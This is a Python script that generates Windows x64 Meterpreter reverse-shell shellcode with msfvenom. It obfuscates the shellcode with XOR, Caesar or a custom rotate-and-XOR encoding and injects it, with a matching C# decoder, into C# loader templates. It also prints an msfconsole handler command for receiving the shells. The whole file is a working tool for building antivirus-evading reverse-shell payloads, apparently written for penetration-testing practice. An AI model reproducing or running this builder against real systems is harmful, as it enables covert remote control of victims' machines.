#!/usr/bin/env python3
import subprocess
import re
import sys
import os

def get_shellcode(lhost, lport, payload_type):
    """
    Constructs and executes the msfvenom command.
    Depending on payload_type ("https" or "tcp"), it builds the payload accordingly.
    """
    payload = f"windows/x64/meterpreter/reverse_{payload_type}"
    cmd = ["msfvenom", "-p", payload, f"LHOST={lhost}", f"LPORT={lport}", "-f", "csharp"]
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, check=True)
        return result.stdout
    except subprocess.CalledProcessError as e:
        print("Error executing msfvenom command:")
        print(e.output)
        return None

def parse_shellcode(output):
    """
    Extracts the shellcode bytes from msfvenom's C# output.
    It looks for the pattern:
      byte[] buf = new byte[<size>] { <bytes> };
    and returns a list of integers.
    """
    pattern = r"byte\[\] buf = new byte\[\d+\] \{([^}]+)\};"
    match = re.search(pattern, output, re.DOTALL)
    if not match:
        print("Could not find shellcode in msfvenom output.")
        return None
    bytes_str = match.group(1)
    byte_list = []
    for byte in bytes_str.split(","):
        byte = byte.strip()
        if byte:
            try:
                byte_list.append(int(byte, 16))
            except ValueError:
                pass
    return byte_list

def format_shellcode(byte_list):
    """
    Formats a list of bytes back into a C# shellcode array.
    """
    formatted = ", ".join(f"0x{b:02x}" for b in byte_list)
    return f"byte[] buf = new byte[{len(byte_list)}] {{{formatted}}};"

def xor_encode(byte_list, key):
    return [b ^ key for b in byte_list]

def caesar_encode(byte_list, key):
    return [(b + key) % 256 for b in byte_list]

def rotate_left(byte, shift):
    return ((byte << shift) & 0xFF) | (byte >> (8 - shift))

def custom_encode(byte_list, key):
    """
    More complex custom encoding that applies multiple transformations:
      1. Add the key (modulo 256).
      2. XOR the result with a derived value ( (key << 1) & 0xFF ).
      3. Rotate the result left by (key % 8) bits.
    """
    shift = key % 8
    derived = (key << 1) & 0xFF
    encoded = []
    for b in byte_list:
        temp = (b + key) % 256
        temp ^= derived
        encoded.append(rotate_left(temp, shift))
    return encoded

def update_template_file(template_path, shellcode_code, decoding_code):
    """
    Reads a template file, replaces the content between markers:
      // Shellcode ... // End Shellcode
      // Decoding ... // End Decoding
    and returns the updated content.
    """
    try:
        with open(template_path, 'r') as f:
            content = f.read()
    except IOError as e:
        print(f"Error reading {template_path}: {e}")
        return None

    # Replace shellcode block.
    shellcode_pattern = re.compile(r'(// Shellcode\s*\n)(.*?)(\n\s*// End Shellcode)', re.DOTALL)
    content, count1 = shellcode_pattern.subn(r'\1' + shellcode_code + r'\3', content)
    if count1 == 0:
        print(f"Warning: Could not find shellcode markers in {template_path}")

    # Replace decoding block.
    decoding_pattern = re.compile(r'(// Decoding\s*\n)(.*?)(\n\s*// End Decoding)', re.DOTALL)
    content, count2 = decoding_pattern.subn(r'\1' + decoding_code + r'\3', content)
    if count2 == 0:
        print(f"Warning: Could not find decoding markers in {template_path}")

    return content

def update_templates(shellcode_str, decoding_str, template_dir="template"):
    """
    Processes each .cs file in the template directory, updates the content,
    and writes a new file in the current directory with '_template' removed from its name.
    """
    if not os.path.isdir(template_dir):
        print(f"Template directory '{template_dir}' not found.")
        return

    for filename in os.listdir(template_dir):
        if filename.endswith(".cs"):
            template_path = os.path.join(template_dir, filename)
            updated_content = update_template_file(template_path, shellcode_str, decoding_str)
            if updated_content is None:
                continue
            # Remove '_template' from the filename.
            new_filename = filename.replace("_template", "")
            output_path = os.path.join(os.getcwd(), new_filename)
            try:
                with open(output_path, 'w') as f:
                    f.write(updated_content)
                print(f"[+] Saved updated file as: {output_path}")
            except IOError as e:
                print(f"Error writing to {output_path}: {e}")

def main():
    # Prompt for msfvenom parameters.
    lhost = input("Enter LHOST (e.g., tun0): ").strip()
    lport = input("Enter LPORT (e.g., 443): ").strip()
    payload_type = input("Enter payload type (https/tcp): ").strip().lower()
    if payload_type not in ["https", "tcp"]:
        print("Invalid payload type entered. Defaulting to 'tcp'.")
        payload_type = "tcp"

    print("\n[+] Generating shellcode with msfvenom...")
    msfvenom_output = get_shellcode(lhost, lport, payload_type)
    if msfvenom_output is None:
        sys.exit(1)

    shellcode = parse_shellcode(msfvenom_output)
    if shellcode is None:
        sys.exit(1)

    print("\nOriginal shellcode:")
    original_shellcode_str = format_shellcode(shellcode)
    print(original_shellcode_str)

    # Choose the encoding method.
    print("\nSelect encoding method:")
    print("  1. XOR encoding")
    print("  2. Caesar cipher encoding")
    print("  3. Custom encoding (more complex)")
    choice = input("Enter choice (1/2/3): ").strip()

    if choice == "1":
        key_input = input("Enter XOR key (in hex, e.g., AA, range: 0x00-0xFF): ").strip()
        if key_input.lower().startswith("0x"):
            key_input = key_input[2:]
        try:
            key = int(key_input, 16)
        except ValueError:
            print("Invalid key provided. Defaulting to 0xAA.")
            key = 0xAA
        encoded = xor_encode(shellcode, key)
        decoding_routine = f"""// XOR decoding
for (int i = 0; i < buf.Length; i++)
{{
    buf[i] = (byte)(buf[i] ^ 0x{key:02x});
}}"""
    elif choice == "2":
        key_input = input("Enter Caesar shift key (integer, range: 0-255): ").strip()
        try:
            key = int(key_input)
            if key < 0 or key > 255:
                raise ValueError()
        except ValueError:
            print("Invalid key provided. Defaulting to 13.")
            key = 13
        encoded = caesar_encode(shellcode, key)
        decoding_routine = f"""// Caesar decoding
for (int i = 0; i < buf.Length; i++)
{{
    buf[i] = (byte)((buf[i] + (256 - {key})) % 256);
}}"""
    elif choice == "3":
        key_input = input("Enter custom encoding key (in hex, e.g., AA, range: 0x00-0xFF): ").strip()
        if key_input.lower().startswith("0x"):
            key_input = key_input[2:]
        try:
            key = int(key_input, 16)
        except ValueError:
            print("Invalid key provided. Defaulting to 0xAA.")
            key = 0xAA
        encoded = custom_encode(shellcode, key)
        # The following C# snippet assumes you add a RotateRight helper method.
        decoding_routine = f"""// Custom decoding
// Helper method:
public static byte RotateRight(byte value, int count)
{{
    return (byte)((value >> count) | (value << (8 - count)));
}}

int key = 0x{key:02x};
int shift = key % 8;
for (int i = 0; i < buf.Length; i++)
{{
    // Reverse the left rotation by performing a right rotation.
    byte rotated = RotateRight(buf[i], shift);
    // Reverse the XOR with the derived value.
    byte temp = (byte)(rotated ^ ((key << 1) & 0xFF));
    // Reverse the addition (modulo 256).
    buf[i] = (byte)((temp + (256 - key)) % 256);
}}"""
    else:
        print("Invalid choice. Exiting.")
        sys.exit(1)

    encoded_shellcode_str = format_shellcode(encoded)

    print("\nEncoded shellcode:")
    print(encoded_shellcode_str)
    print("\nC# Decoding Routine:")
    print(decoding_routine)
    
    # Construct and print the msfconsole command to start a multi/handler.
    console_cmd = (f'msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_{payload_type}; '
                   f'set LHOST {lhost}; set LPORT {lport}; set ExitOnSession false; exploit -j"')
    print("\n[+] To start the Metasploit handler, run the following msfconsole command:")
    print(console_cmd)
    
    # Update all template files and save them to the current directory.
    update_templates(encoded_shellcode_str, decoding_routine, template_dir="template")

if __name__ == "__main__":
    main()

